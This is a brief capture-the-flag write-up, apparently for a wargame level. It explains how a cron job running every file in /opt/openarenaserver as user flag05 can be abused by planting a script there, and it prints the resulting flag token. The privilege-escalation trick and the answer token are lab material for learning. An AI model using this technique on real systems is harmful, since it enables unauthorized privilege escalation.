we can see this in our email:
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
this means this script is excuting every 2 minutes
we can see in the script there are this:
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done

so we can put a script in /opt/openarenaserver and it will be execute as flag05
so we put this script => getflag > /tmp/flag.txt
Wait 2 min and we cat /tmp/flag.txt
Output => Check flag.Here is your token : viuaaale9huek52boumoomioc
